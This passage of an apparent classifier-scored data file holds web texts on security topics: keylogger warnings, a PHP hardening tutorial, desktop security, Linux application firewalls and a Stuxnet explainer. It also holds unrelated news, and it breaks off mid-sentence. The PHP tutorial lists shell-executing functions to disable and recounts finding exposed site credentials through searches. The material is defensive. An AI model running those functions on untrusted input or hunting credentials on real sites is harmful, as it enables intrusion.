        "text": "Data storage and management software is used to help manage the tasks associated with maintaining and accessing data stored in data files. Backup and Recovery Software (35 suppliers) Backup software and recovery software creates copies of files, databases, disks, drives, or entire computer systems to avoid the permanent loss of data. These applications also enable the retrieval of data from damaged files, storage devices, or file systems. Learn more about Backup and Recovery Software Data Storage Management Software (493 suppliers) Data storage management software is designed for database management, data backup and recovery, and other data management functions. Learn more about Data Storage Management Software Data Warehousing Software (39 suppliers) Data warehousing software is used to design, build, manage, implement, and improve data warehouses, repositories of electronically-stored data. Learn more about Data Warehousing Software Storage Resource and Replication Software (16 suppliers) Storage resource and storage replication software is used to monitor the efficiency and speed at which available drive space is utilized in a storage area network (SAN). Learn more about Storage Resource and Replication Software",
        "prob": "tensor([[8.5526e-06, 9.9999e-01]])"
    },
    {
        "text": "In an increasingly wired and interconnected world, you may be tempted to access your online banking from public Wi-Fi, accept files from people you know only through social-media connections, try out numerous freeware smartphone apps and assume that password protection offers sufficient security for your wireless home network. In the real world of online crooks, scams and fraud, however, these practices can make you a sitting duck for keystroke logger scams. How Keylogging Works Keystroke loggers act as data recorders that compile a record of every keystroke you type on your computer. They can be used to obtain illicit access to usernames, passwords, social security numbers and other personally identifiable information, financial data, proprietary technical or business secrets, and formal or casual communications between individuals who use chat or text methods. Some keyloggers run as software programs in the background of your regular computer operations. Others hook directly into your operating system and take over the functions of keystroke interpretation. Finally, some run from hardware devices plugged in to your computer. These virtual or physical pieces of malware can store captured data for physical retrieval or transmit it through your Internet connection to a remote a location. A scammer with physical access to your desktop computer can attach a device that contains a keylogging payload to one of the ports on your system. Designed to look like a dongle, plug or cable, these gadgets work most effectively when they attach to the back of your computer, minimizing the likelihood that you recognize their presence. The size and shape of a laptop computer reduces the chances of a keylogger attachment escaping your view, but a keylogger delivered through a USB flash drive could escape your notice. Alternatively, however, one of these devices plugged in to a public computer can bypass the awareness of everyone who used an unfamiliar system. Avoid flash drives of unknown origin and remain alert to changes in your computer's configuration. At the same time, restrict your use of public Wi-Fi to activities that don't disclose your personal and financial information. Phishing email scams often include either an attachment that a message encourages you to activate by clicking on it or a link to a site you're encouraged to visit. These messages and their directly attached or indirectly acquired malware payloads can serve as an effective means of introducing software-based keyloggers onto your computer. If you've educated yourself about phishing scams and carefully resist the temptation to click on attachments in suspicious messages or those from unknown senders, you can limit your vulnerability to keyloggers, but maintaining an up-to-date anti-malware program in addition can halt an attack that comes from a dubious file or website destination. Smartphones can act as pocket computers, providing unparalleled mobile access to your personal data and files as well as online destinations. Their power, flexibility and mobility also make them ideal targets for phishing scams that can install malware. Free apps can consist entirely of keylogging routines, activated when you install a product only to find that it lacks any business or entertainment value, and become infected in the process. Some freeware products incorporate keyloggers into routines that offer some actual value -- entertainment or otherwise -- but that also record the websites you visit or other aspects of your online behavior, reporting these details to a company that sells consumer-behavior information. - Tompkins Trust Company: Trojans and Keystroke Logging - Dark Reading: FBI Warns Of Scams Targeting Financial Industry - Symantec: Introduction to Spyware Keyloggers - Securelist: Keyloggers: How They Work and How to Detect Them (Part 1) - Nedbank: Keystroke Logging - eWeek: Police Foil $420 Million Keylogger Scam - The Register: Hardware Keyloggers Found in Manchester Library PCs - The Register: Police Cuff US Student Keystroke Logger - SecurityFocus: Guilty Plea in Kinko's Keystroke Caper - MSN Money: Your Smartphone May Be Spying on You - CNET: FAQ: Demystifying ID Fraud - Identity Guard Resource Center: Keylogging: Identity Theft Threat or Useful Tool for Employers? - Western Australia Police: What Are Keystroke Loggers? - Community Financial Services Bank: Fraud Security: Protecting Yourself from Online Banking Fraud - MSN Money: Financial Privacy: Be Wary of These 9 Credit Card Scams - Visa Data Security Alert: Key Logger Malware: Key Stroke and Screen Capture - NerdWallet: Beware of Scams During the Holidays - The Register: Mission Impossible at the Sumitomo Bank - Jupiterimages/Comstock/Getty Images",
        "prob": "tensor([[2.1075e-06, 1.0000e+00]])"
    },
    {
        "text": "WebMD Medical News Daniel J. DeNoon Laura J. Martin, MD April 8, 2011 -- What does a government shutdown mean for our health? Here's WebMD's FAQ, with answers to questions from WebMD readers and staff. Most government health services are administered by the Department of Health and Human Services. During the government shutdown, 62% of HHS employees will not be allowed to work. The remaining 38% of HHS employees will continue to administer programs that involve the safety of human life and protection of property, as well as programs that pay for themselves. HHS shutdown plans remain sketchy, but here's a rundown of how the shutdown affects HHS services: The Veterans Administration is a major source of government supported health care. Here's how the shutdown affects the VA: Other non-HHS health services affected by the government shutdown include: Probably not. However, closing of most of the FDA means that there will be less drug-safety oversight. Cutbacks at the Centers for Medicare and Medicaid Services mean the popular CMS hotline will have longer wait times, and investigations of Medicare/Medicaid fraud will be suspended. Dialysis is a life-saving medical procedure. Dialysis centers will not be closed, and patients whose dialysis is supported by Medicare will continue to receive services. Government health insurance will remain in effect. Social Security itself is not affected by the government shutdown, as it is funded separately. But some government employees who administer Social Security will be furloughed. This likely means that processing of new Social Security applications will slow down, and there will be longer wait times to speak with Social Security personnel. SOURCES:Scott Wolfson, director, public information office, Consumer Product Safety Commission.Department of Health and Human Services: \"Contingency Staffing Plan for Operations in the Absence of Enacted Annual Appropriations,\" April 7, 2011.USDS Food Safety and Inspection Service: \"Operations Plan for Absence of Appropriations,\" April 7, 2011.Department of Veterans Affairs: \"VA Contingency Plan: Agency Operations in the Absence of Appropriations,\" April 8, 2011.U.S. Office of Personnel Management: \"The Potential Impact of a Lapse in Appropriations on Federal Employees,\" April 7, 2011.U.S. Department of Agriculture Contingency Plans.Office of Management and Budget: \"Agency Contingency Plans.\" Here are the most recent story comments.View All The views expressed here do not necessarily represent those of FOX16 - Breaking News and Weather to Plan Your Day for Little Rock and Central Arkansas The Health News section does not provide medical advice, diagnosis or treatment. See additional information.",
        "prob": "tensor([[0.0014, 0.9986]])"
    },
    {
        "text": "PHP is considered an insecure language to develop in not because of secret backdoors put in by the PHP language developers, but because it was initially developed without security as a major concern and compared to other languages/web frameworks its difficult to develop securely in it. E.g., if you develop a LAMP/LAPP (linux+apache+mysql/postgresql+PHP) web app, you have to manually code in input/output sanitation to prevent SQL injection/XSS/CSRF, make sure there are no subtle calls to eval user-supplied code (like in preg_replace with a '/e' ending the regexp argument), safely deal with file uploads, make sure user passwords are securely hashed (not plaintext), authentication cookies are unguessable, secure (https) and http-only, etc. Most modern web-frameworks simplify many of these issues by doing most of these things in a secure fashion (or initially doing them insecurely and then getting secure updates). The risk of there being a secret backdoor in an open-source PHP is small; and the risk is present in every piece of software (windows/linux/apache/nginx/IIS/postgresql/oracle) you use -- both open-source and closed-source. The open-source ones at least have the benefit that many independent eyes look at it all the time and you could examine it if you wanted. Also note in principle, even after fully examining the source code and finding no backdoors and fully examining the source code of your compiler (finding no backdoors), if you then recompile your compiler (bootstrap by using some untrusted existing compiler) and then compile the safe source code with your newly compiled \"safe\" compiler, your executable code could still have backdoors brought in from using the untrusted existing compiler to compile the new compiler. See Ken Thompson's Reflections on Trusting Trust. (The way this is defended against in practice is by using many independent and obscure compilers from multiple sources to compile any new compiler and then compare the output).",
        "prob": "tensor([[2.6599e-06, 1.0000e+00]])"
    },
    {
        "text": "In Writing Secure PHP, I covered a few of the most common security holes in websites. It's time to move on, though, to a few more advanced techniques for securing a website. As techniques for 'breaking into' a site or crashing a site become more advanced, so must the methods used to stop those attacks. Most hosting environments are very similar, and rather predictable. Many web developers are also very predictable. It doesn't take a genius to guess that a site's includes (and most dynamic sites use an includes directory for common files) is an www.website.com/includes/. If the site owner has allowed directory listing on the server, anyone can navigate to that folder and browse files. Imagine for a second that you have a database connection script, and you want to connect to the database from every page on your site. You might well place that in your includes folder, and call it something like connect.inc. However, this is very predictable - many people do exactly this. Worst of all, a file with the extension \".inc\" is usually rendered as text and output to the browser, rather than processed as a PHP script - meaning if someone were to visit that file in a browser, they'll be given your database login information. Placing important files in predictable places with predictable names is a recipe for disaster. Placing them outside the web root can help to lessen the risk, but is not a foolproof solution. The best way to protect your important files from vulnerabilities is to place them outside the web root, in an unusually-named folder, and to make sure that error reporting is set to off (which should make life difficult for anyone hoping to find out where your important files are kept). You should also make sure directory listing is not allowed, and that all folders have a file named \"index.html\" in (at least), so that nobody can ever see the contents of a folder. Never, ever, give a file the extension \".inc\". If you must have \".inc\" in the extension, use the extension \".inc.php\", as that will ensure the file is processed by the PHP engine (meaning that anything like a username and password is not sent to the user). Always make sure your includes folder is outside your web root, and not named something obvious. Always make sure you add a blank file named \"index.html\" to all folders like include or image folders - even if you deny directory listing yourself, you may one day change hosts, or someone else may alter your server configuration - if directory listing is allowed, then your index.html file will make sure the user always receives a blank page rather than the directory listing. As well, always make sure directory listing is denied on your web server (easily done with .htaccess or httpd.conf). Out of sheer curiosity, shortly after writing this section of this tutorial, I decided to see how many sites I could find in a few minutes vulnerable to this type of attack. Using Google and a few obvious search phrases, I found about 30 database connection scripts, complete with usernames and passwords. A little more hunting turned up plenty more open include directories, with plenty more database connections and even FTP details. All in, it took about ten minutes to find enough information to cause serious damage to around 50 sites, without even using these vulnerabilities to see if it were possible to cause problems for other sites sharing the same server. Most site owners now require an online administration area or CMS (content management system), so that they can make changes to their site without needing to know how to use an FTP client. Often, these are placed in predictable locations (as covered in the last article), however placing an administration area in a hard-to-find location isn't enough to protect it. Most CMSes allow users to change their password to anything they choose. Many users will pick an easy-to-remember word, often the name of a loved one or something similar with special significance to them. Attackers will use something called a \"dictionary attack\" (or \"brute force attack\") to break this kind of protection. A dictionary attack involves entering each word from the dictionary in turn as the password until the correct one is found. The best way to protect against this is threefold. First, you should add a turing test to a login page. Have a randomly generated series of letters and numbers on the page that the user must enter to login. Make sure this series changes each time the user tries to login, that it is an image (rather than simple text), and that it cannot be identified by an optical character recognition script. Second, add in a simple counter. If you detect a certain number of failed logins in a row, disable logging in to the administration area until it is reactivated by someone responsible. If you only allow each potential attacker a small number of attempts to guess a password, they will have to be very lucky indeed to gain access to the protected area. This might be inconvenient for authentic users, however is usually a price worth paying. Finally, make sure you track IP addresses of both those users who successfully login and those who don't. If you spot repeated attempts from a single IP address to access the site, you may consider blocking access from that IP address altogether. One excellent way to make sure that even if you have a problem with someone accessing your database who shouldn't be able to, you can limit the damage they can cause. Modern databases like MySQL and SQL Server allow you to control what a user can and cannot do. You can give users (or not) permission to create data, edit, delete, and more using these permissions. Usually, I try and ensure that I only allow users to add and edit data. If a site requires an item be deleted, I will usually set the front end of the site to only appear to delete the item. For example, you could have a numeric field called \"item_deleted\", and set it to 1 when an item is deleted. You can then use that to prevent users seeing these items. You can then purge these later if required, yourself, while not giving your users \"delete\" permissions for the database. If a user cannot delete or drop tables, neither can someone who finds out the user login to the database (though obviously they can still do damage). PHP contains a variety of commands with access to the operating system of the server, and that can interact with other programs. Unless you need access to these specific commands, it is highly recommended that you disable them entirely. For example, the eval() function allows you to treat a string as PHP code and execute it. This can be a useful tool on occasion. However, if using the eval() function on any input from the user, the user could cause all sorts of problems. You could be, without careful input validation, giving the user free reign to execute whatever commands he or she wants. There are ways to get around this. Not using eval() is a good start. However, the php.ini file gives you a way to completely disable certain functions in PHP - \"disable_functions\". This directive of the php.ini file takes a comma-separated list of function names, and will completely disable these in PHP. Commonly disabled functions include ini_set(), exec(), fopen(), popen(), passthru(), readfile(), file(), shell_exec() and system(). It may be (it usually is) worth enabling safe_mode on your server. This instructs PHP to limit the use of functions and operators that can be used to cause problems. If it is possible to enable safe_mode and still have your scripts function, it is usually best to do so. Finally, Be Completely and Utterly Paranoid Much as I hate to bring this point up again, it still holds true (and always will). Most of the above problems can be avoided through careful input validation. Some become obvious points to address when you assume everyone is out to destroy your site. If you are prepared for the worst, you should be able to deal with anything. Ready for more? Try Writing Secure PHP, Part 3.",
        "prob": "tensor([[2.0594e-06, 1.0000e+00]])"
    },
    {
        "text": "Cyberattacks on IT systems are increasing at an exponential rate. From 2006 to 2009, organizations reported that the number of security incidents grew more than 400 percent. According to reports, many of these security breaches were introduced at the user level. Along with an increase in attacks, there has also been an increase in the quantity and type of data stored on networks. Given the number of staff members with varying security levels who require access to networks, organizations have had to redouble efforts to protect data and systems. Yet securing the desktop, a major access point to the network, is often overlooked. Following are some simple and effective ways to protect desktops — ensuring that they do not become gateways for unauthorized access to the agency network. Although it's common practice in many organizations to limit the use of flash drives and other devices that utilize USB ports, many others do not do this. Flash drives open organizations to data theft, and an infected USB device can introduce viruses. If it's necessary to use flash drives, it's best to select a secure drive with on-board antivirus software. Typically, antivirus software is already installed on PCs when they arrive from the factory. This is often the first line of defense against viruses attempting to gain access via individual client devices. Whether scanning e-mail attachments or preventing intrusions from infected websites, antivirus software should not be ignored. Many users, however, disable their antivirus software or do not update it. These actions render the software ineffective or obsolete. Scheduling automatic updates and maintaining the software are both necessary for it to remain effective and serve as a defense against the barrage of viruses that attack networks every day. Most malware that enters a desktop, and ultimately the network, comes from users who have downloaded infected software or applications. Restricting the ability of staff to automatically download software or applications reduces vulnerabilities at the desktop and limits the ways in which malware can access an organization's systems. Secure KVM (keyboard, video, mouse) switches let users access both secure and nonsecure networks through a single set of peripherals. By keeping various networks isolated from one another, secure KVM switching devices eliminate potential data breaches. Authorized workers can then access secure data with neither the threat of introducing harmful data to the secure network nor any risk of accidentally copying or transferring classified data to systems outside the secure network. Additionally, many secure KVM switches can lock down USB devices, allowing only authorized devices — such as keyboards, mice and Common Access Card readers — to connect to the network. Threats are on the rise, with company data and systems as prime targets for hostile foreign governments, terrorists and cybercriminals. The threat posed to federal systems must be addressed using a variety of security solutions; but don't overlook the desktop, which represents one of the most vulnerable access points in any organization's infrastructure.",
        "prob": "tensor([[2.1405e-06, 1.0000e+00]])"
    },
    {
        "text": "Ah, the dreaded computer viruses! We’ve all heard about their evil powers: they range from simple pranks like pop-up messages on your screen to complete destruction of programs or data. And they’re getting slicker by the hour, trying to trick you, outsmart your antivirus program and take advantage of the security holes caused by software vulnerabilities. You definitely don’t want one getting into your precious computer! So how can you tell if you've got a virus infection? If your antivirus software is effective and up to date, you’ll probably receive a message saying that the application has found a virus on your PC and has, hopefully, got rid of it. But what if your antivirus is not that efficient, hasn’t been updated in a while or is simply something you never thought you actually needed? There are some signs of infection you can watch out for: Your computer stops responding or locks up frequently. You get strange error messages saying that, for example, you cannot access certain drives. Your PC runs much slower than it used to. Your computer crashes and then restarts every couple of minutes. Some applications won’t run, some files won’t open. Hardware devices (like your printer) no longer respond to your commands or start acting out. Some menus and/or dialogue boxes look odd or distorted. There are fluctuations in the size of some files, although you haven’t accessed them in a while. Your firewall warns you that unknown applications are trying to connect to the internet. Your internet connection stops working or becomes very slow without there being a problem with your service provider or router. You notice files that have been deleted, encrypted or moved to a different location. The language in certain applications suddenly changes. New icons appear on your desktop out of the blue. Strange sounds or music start playing from your speakers unexpectedly. Your CD-ROM drive tray opens and closes by itself. The unused space on your hard drive disappears. Your computer opens internet sessions or applications on its own. Your web browser displays pages you haven’t requested. Library files for running games or programs go missing. What to do if you suspect a virus is running loose in your system: The first thing to do is turn to your line of defence: the antivirus program. If you’re using a traditional, signature-based antivirus, make sure it’s active and properly updated and scan your computer. If your antivirus program doesn’t find a virus, it doesn’t necessarily mean you’ve got none. But there’s no need to go searching for it yourself. Just look for another antivirus solution to run on your computer and spot the problem. You can find a free BullGuard Internet Security trial here. If it turns out a virus did get by your antivirus, chances are it hit exactly between the updates or it’s so new, its signature hasn’t been detected yet. This is where state-of-the-art virus detection technology comes in handy and that’s what you get by using BullGuard Internet Security – the best in behavioural detection, the latest technology in the fight against new and unknown viruses. Behaviour-based detection is what makes BullGuard catch 65% more malware than traditional antivirus programs. How to avoid virus infections in the first place You can prevent most viruses from entering your system by practicing a few computer and internet safe habits: Make a habit out of playing it safe. Pay attention to what you download and where you download it from. Never open attachments from sources you don’t know or trust. Don’t connect other people’s USB drives to your computer, even if they’re your friends, as they could have a virus infection without realizing it. Always have an active and updated antivirus program installed on your computer. The more effective and modern it is, the better it will protect you against the waves of malware hitting the web every day. Make sure all your other software is up to date. Vulnerabilities in the programs you use, like your operating system, are like unlocked backdoors for viruses, so it’s crucial to have them solved by getting constant patches and updates from the software vendor. Some of them are downloaded automatically, but others need your attention and that could turn into an annoying task. So give yourself a break and use a vulnerability scanner – like the one included in BullGuard Internet Security – to take care of your programs for you.",
        "prob": "tensor([[0.0013, 0.9987]])"
    },
    {
        "text": "A packet filtering firewall, designed to regulate incoming and outgoing packets from a network or an operating system, is akin to security personnel guarding the entrance to a commercial or residential property. Such a system has very little authority, unless given additional powers, in what applications inside the operating system or network are able to do. That is where an application “firewall” comes into play. It is designed to ensure that applications in an operating system (or in some instances, a network) adhere to access control rules that govern their “activities.” It should be noted that an application firewall, like a stateful packet filter, is not a one-shot security solution. It merely adds an extra layer of security to a system, complementing other security protocols and systems in place. That idea also formed the main point of why your computer needs a firewall enabled. This crude sketch shows applications in an operating system when there is no application firewall to regulated their actions. They are free to wander as they please. And here is what it looks like with an application firewall activated. By the way, this screen shot and the one above, were taken from Tomoyo’s website, an application firewall featured in this article: There are three such applications built into the Linux kernel, and they are available as loadable modules. While they tend to be described using slightly different terminologies, and may even differ in how to operate, once activated, they have the same effect – intelligently enforcing access rights for applications they are configured to monitor. In alphabetical order, the three application firewalls are: An effective and easy-to-use Linux application security system. AppArmor proactively protects the operating system and applications from external or internal threats, even zero-day attacks, by enforcing good behavior and preventing even unknown application flaws from being exploited. AppArmor security policies completely define what system resources individual applications can access, and with what privileges. A number of default policies are included with AppArmor, and using a combination of advanced static analysis and learning-based tools, AppArmor policies for even very complex applications can be deployed successfully in a matter of hours. SELinux, or Security-Enhanced Linux, was contributed to the Linux kernel by the National Security Agency. It is the application firewall activated by default in Fedora, and it has a reputation as being a bit more difficult to manage and configure than the others. The following is a brief description of SELinux from its Fedora project page. Security-Enhanced Linux (SELinux) adds Mandatory Access Control (MAC) to the Linux kernel, and is enabled by default in Fedora. A general purpose MAC architecture needs the ability to enforce an administratively-set security policy over all processes and files in the system, basing decisions on labels containing a variety of security-relevant information. When properly implemented, it enables a system to adequately defend itself and offers critical support for application security by protecting against the tampering with, and bypassing of, secured applications. MAC provides strong separation of applications that permits the safe execution of untrustworthy applications. Its ability to limit the privileges associated with executing processes limits the scope of potential damage that can result from the exploitation of vulnerabilities in applications and system services. MAC enables information to be protected from legitimate users with limited authorization as well as from authorized users who have unwittingly executed malicious applications. Tomoyo was launched in 2003 and its development is sponsored by Japan’s NTT DATA Corporation. It is, as far as I know, the only one that is not used by default on any Linux distribution. However, that should change when the next edition of Chakra Edn is released. According to the official description, Tomoyo is a: Mandatory Access Control (MAC) implementation for Linux that can be used to increase the security of a system, while also being useful purely as a system analysis tool. TOMOYO Linux focuses on the behaviour of a system. Every process is created to achieve a purpose, and like an immigration officer, TOMOYO Linux allows each process to declare behaviours and resources needed to achieve their purpose. When protection is enabled, TOMOYO Linux acts like an operation watchdog, restricting each process to only the behaviours and resources allowed by the administrator. Most distributions have one of these applications activated by default. If yours does not, talk to the developer(s) about it. Sometimes, all you need to do is install the userland utilities for managing it.",
        "prob": "tensor([[2.4299e-06, 1.0000e+00]])"
    },
    {
        "text": "Smart phone of the future: A chip in your head? CNN recently posted an amusing yet thought-provoking article envisioning the development of smart phones over the next 100 years. The story culminates with the collapse of civilization in less than a century (from climate change), and mobile communications being reduced to throwing message rocks at each other. That scenario might’ve made Stanley Kubrick proud, but the idea that most interests me is the authors’ prediction that, in 75 years, a microchip could be inserted into our heads that will allow us to connect directly with others through our brains, as well as to the Internet. While the writers are concerned about potential abuses from commercial advertisers, I can think of a few ways this technology would affect the public sector workplace. First, security identification badges would become obsolete. Authentication for location access could be done with the brain microchip, and everyone would instantly know if another person was supposed to be there instead because his or her own chip would tell them so. Of course, for this to take place, security would have to be top-notch to stop intruders from using chips made to mask identity. Wow, that sounds like the plot to a great science fiction espionage thriller. You are welcome, 007. The behavior modification scenario the writers propose would be unlikely to occur, I think, because the chip probably would not be connected to that area of the brain. But if it were, network administrators could finally make sure their painstakingly crafted security protocols are actually followed by everyone! Although the writers project that this development is 75 years away, I think it might come sooner. We already have the technology to make a chip small enough to perform all of the necessary functions. The areas we need to improve in are biological rejection suppression and our understanding of how the human brain works. I’m guessing that latter will probably be the problem that delays us having chips implanted in our heads. It’s all just guesswork at this point, of course, but if the writers are correct about a brain microchip — and wrong about the end of civilization — there would be practical uses for the technology. If nothing else, we could be assured that motorists at last would make only hands-free calls. Posted by Greg Crowe on Oct 12, 2012 at 1:25 PM",
        "prob": "tensor([[0.0087, 0.9913]])"
    },
    {
        "text": "From identifying Osama bin Laden to proving someone guilty of rape or murder, DNA analysis has become an essential scientific tool for police and criminal justice. Unique genetic markers could play a crucial role in the trial of ex-IMF chief Dominique Strauss-Kahn, accused of sexually assaulting a hotel maid in New York. Various media reports, citing sources close to the investigation, have said that DNA from Strauss-Kahn -- believed to be traces of semen -- was found on the shirt of the 32-year-old woman, who has alleged that the French political heavyweight tried to rape her in his hotel suite on May 14. \"The DNA technique, the nuclear DNA, is the one and only technique, if properly conducted, that has an extraordinarily high odds against a misidentification,\" said University of Arizona professor of chemistry and geoscience Bonner Denton. \"It's very close to 100 percent... It's a much better technique than many other forensic identification techniques, even finger prints.\" Thanks to DNA analysis and other tests, US officials were able to say they were certain bin Laden was dead, with just a one in 11.8 quadrillion chance of mistaken identity. CIA specialists first compared photographs of the Al-Qaeda leader's corpse to photographs of bin Laden and then reviewed a DNA sample against a \"comprehensive profile\" derived from some of his many family members. As a result, an intelligence official said there was no doubt that a team of US Navy SEALs that raided a compound in Pakistan on May 1 had killed the Al-Qaeda founder. Denton was part of a National Research Council team that wrote a key report about DNA analysis in 2009 for the US Congress. \"Nuclear DNA analysis has been subjected to more scrutiny than any other forensic discipline, with extensive experimentation and validation performed prior to its use in investigations,\" the report said. It concluded that the US medical-legal system needed to be revamped because forensics labs were backlogged and understaffed. More than half of the first 250 people released from prison thanks to a DNA test exonerating them had been initially found guilty based on erroneous medical analysis. DNA analysis entered the US criminal system in 1987 when a serial rapist in Florida became the first person whose guilt was proven using the technique. Federal authorities, including the US military and all 50 states, now archive DNA samples. The FBI has developed the powerful Combined DNA Index System (CODIS), which catalogs millions of samples. Every Monday morning, the FBI launches a CODIS search automatically comparing millions of DNA profiles of people who were arrested or found guilty with samples collected in cold cases. The methodology has allowed CODIS to confirm the guilt of 140,000 criminals since 1994 and to prove 269 people innocent since 1989, according to University of Virginia School of Law professor Brandon Garrett. Each year, DNA analysis clears thousands of suspects, even early on in police investigations. A federal investigation in the 1990s found that 25 percent of principal suspects had been cleared of all suspicion thanks to DNA tests. The reliability of the technique can also establish the identity of a child's parents at low cost. And it shed new light on the relationship between Thomas Jefferson and the third US president's black slave Sally Hemings, finding that he likely fathered several children with her. Explore further: Don't lose the organism in the excitement over its genes, biologists urge",
        "prob": "tensor([[0.3075, 0.6925]])"
    },
    {
        "text": "Remotes via IP Putting it all together So let me summarize the problems with Internet transmission of audio and the techniques used to minimize them. First, there is network congestion, or plain lack of bandwidth. That issue is tackled by minimizing the necessary bandwidth, by using a lossy codec (or in the case of APT, making use of ADPCM) and striking a correct balance between bandwidth and packet size. Loss of packets is addressed to the extent practicable by FEC. Packet jitter is addressed with a jitter buffer. All that said, network security is yet another issue. Your LAN is likely attached to a router that allows users on your network to access the Internet. The connections made through this router originate behind it - on the LAN side. The router will allow access to the Internet, and in turn it expects a response from the far end. But think about it: If you are in the field, and trying to connect to an IP codec connected to your network, and the router serves as a firewall, the connection will be refused. As far as that router is concerned, an intrusion is being attempted. There are several ways around this. The first is to inform the network administrator that for the new IP codec to work, certain ports need to be open on the firewall, so the IP codec in the field can set up communication between itself and the studio codec. If your network architecture includes a DMZ, your network admin may allow you to place the IP codec on that subnet instead. The second way is a bit more complicated; consider this if your network administer doesn't want to play ball with you. A proxy server can be used as an intermediary. This proxy server is located outside the firewall. A session can be initiated by the studio codec to this proxy server; the proxy records the IP address (among other things) of the studio codec and actually maintains the connection thereafter. From the field, you connect to the proxy server, and it redirects the packet data to the studio codec, through the same connection it has kept open. And there is a final way to do this, which may be the easiest way. Have an Internet connection put into the studio (like DSL or cable) and reserve its use for just the IP codec. Leave it completely isolated from the LAN, so you can forsake those network security issues. One problem with this method is that your Internet provider may not provide you with a static IP address. Either pick one that does, or make sure you know if and when the IP address has changed before you head out into the field. Making use of the Internet for remotes can be looked at as a double-edged sword; while one has to take the time to learn about a whole new technology (and undoubtedly be tripped up a few times along the way), the universe of locations from which remotes can be done opens up dramatically. I for one believe that good remotes can make for good radio; and I'm quite sure that, 5 to 10 years out, the trepidation experienced in going out to do an IP remote for the first time will have long since evaporated. |Codec||Connectivity||Size||Audio I/O||User Access||Supported Encoding Algorithms||Max Audio Freq.||Variable Packet Size||FEC||Packet Jitter Buffer| |MPEG 1/2 layer 2/3||AAC||G.722||Linear||Apt-x||other/ |APT Worldcast Eclipse aptx.com||IP, ISDN, X.21/V.35||1RU||analog or AES-3||GUI||Y||Y||Y||Y||Y||-||24kHz||Y||N||Y| |Musicam Suprima musicamusa.com||IP, ISDN X.21/V.35||1RU||analog or AES-3||Web Browser||Y||Y||Y||Y||Y||-||24kHz||Y||N||Y| |AEQ Phoenix aeqbroadcast.com||IP, ISDN X.21/V.35||1RU||analog or AES-3||Front Panel, USB||Y||Y||Y||Y||N||-||20kHz||Y during setup||N||Y| |Audio TX STL-IP www.audiotx.com||IP||1RU||analog or AES-3||Web Browser||Y||Y||Y||Y||N||-||48kHz||N||Y||Y| |Telos Iport telos-systems.com||IP||2RU||analog or AES-3||Web Browser||Y||Y||N||N||N||-||20kHz||N||N||N| |Comrex Access comrex.com||IP||1RU||analog or AES-3||Web Browser||N||optional||N||N||N||BRIC HQ1, HQ2||15kHz||Y||Y||Y| |Tieline IP tieline.com||IP, optional ISDN, X.21/V.35, POTS, GSM||1RU and 2RU||analog and AES-3||Front Panel, USB, Web Browser, RJ-45||Layer 2||N||Y||Y||N||Tieline Voice, Tieline Music, Tieline Music Plus, Raw Audio||23kHz||Y||Y||Y| Irwin is the chief engineer of WKTU-FM, New York City. Acceptable Use Policy blog comments powered by Disqus [an error occurred while processing this directive] Today in Radio History The history of radio broadcasting extends beyond the work of a few famous inventors. EAS Information More on EAS The feed provides feeds for all US states and territories. Need a calendar for your computer desktop? Use one of ours. Information from manufacturers and associations about industry news, products, technology and business announcements. This high-visibility and high-traffic area got the full acoustic treatment. Browse Back Issues[an error occurred while processing this directive] Also in the May Issue - Remote Access and Site Connectivity: Wireless - Standards of FM Allocation and Interference - Side by Side: Mic Processors - Field Report: Deva Broadcast DB4004 - Field Report: APT WorldCast Systems Horizon NextGen - New Products - 20 Years of Radio magazine: May 1994",
        "prob": "tensor([[0.0779, 0.9221]])"
    },
    {
        "text": "In the 20th century, this would have been a job for James Bond. The mission: Infiltrate the highly advanced, securely guarded enemy headquarters where scientists in the clutches of an evil master are secretly building a weapon that can destroy the world. Then render that weapon harmless and escape undetected. But in the 21st century, Bond doesn't get the call. Instead, the job is handled by a suave and very sophisticated secret computer worm, a jumble of code called Stuxnet, which in the last year has not only crippled Iran's nuclear program but has caused a major rethinking of computer security around the globe. Intelligence agencies, computer security companies and the nuclear industry have been trying to analyze the worm since it was discovered in June by a Belarus-based company that was doing business in Iran. And what they've all found, says Sean McGurk, the Homeland Security Department's acting director of national cyber security and communications integration, is a “game changer.” The construction of the worm was so advanced, it was “like the arrival of an F-35 into a World War I battlefield,” says Ralph Langner, the computer expert who was the first to sound the alarm about Stuxnet. Others have called it the first “weaponized” computer virus. Simply put, Stuxnet is an incredibly advanced, undetectable computer worm that took years to construct and was designed to jump from computer to computer until it found the specific, protected control system that it aimed to destroy: Iran’s nuclear enrichment program. The target was seemingly impenetrable; for security reasons, it lay several stories underground and was not connected to the World Wide Web. And that meant Stuxnet had to act as sort of a computer cruise missile: As it made its passage through a set of unconnected computers, it had to grow and adapt to security measures and other changes until it reached one that could bring it into the nuclear facility. When it ultimately found its target, it would have to secretly manipulate it until it was so compromised it ceased normal functions. And finally, after the job was done, the worm would have to destroy itself without leaving a trace. That is what we are learning happened at Iran's nuclear facilities -- both at Natanz, which houses the centrifuge arrays used for processing uranium into nuclear fuel, and, to a lesser extent, at Bushehr, Iran's nuclear power plant. At Natanz, for almost 17 months, Stuxnet quietly worked its way into the system and targeted a specific component -- the frequency converters made by the German equipment manufacturer Siemens that regulated the speed of the spinning centrifuges used to create nuclear fuel. The worm then took control of the speed at which the centrifuges spun, making them turn so fast in a quick burst that they would be damaged but not destroyed. And at the same time, the worm masked that change in speed from being discovered at the centrifuges' control panel. At Bushehr, meanwhile, a second secret set of codes, which Langner called “digital warheads,” targeted the Russian-built power plant's massive steam turbine. Here's how it worked, according to experts who have examined the worm: --The nuclear facility in Iran runs an “air gap” security system, meaning it has no connections to the Web, making it secure from outside penetration. Stuxnet was designed and sent into the area around Iran's Natanz nuclear power plant -- just how may never be known -- to infect a number of computers on the assumption that someone working in the plant would take work home on a flash drive, acquire the worm and then bring it back to the plant. --Once the worm was inside the plant, the next step was to get the computer system there to trust it and allow it into the system. That was accomplished because the worm contained a “digital certificate” stolen from JMicron, a large company in an industrial park in Taiwan. (When the worm was later discovered it quickly replaced the original digital certificate with another certificate, also stolen from another company, Realtek, a few doors down in the same industrial park in Taiwan.) --Once allowed entry, the worm contained four “Zero Day” elements in its first target, the Windows 7 operating system that controlled the overall operation of the plant. Zero Day elements are rare and extremely valuable vulnerabilities in a computer system that can be exploited only once. Two of the vulnerabilities were known, but the other two had never been discovered. Experts say no hacker would waste Zero Days in that manner. --After penetrating the Windows operating system, the code then targeted the siemens operating system that controlled the plant. Once that was in its grip it then took over the “frequency converters” that ran the centrifuges. To do that it used specifications from the manufacturers of the converters. One was Vacon, a Finnish Company, and the other Fararo Paya, an Iranian company. What surprises experts at this step is that the Iranian company was so secret that not 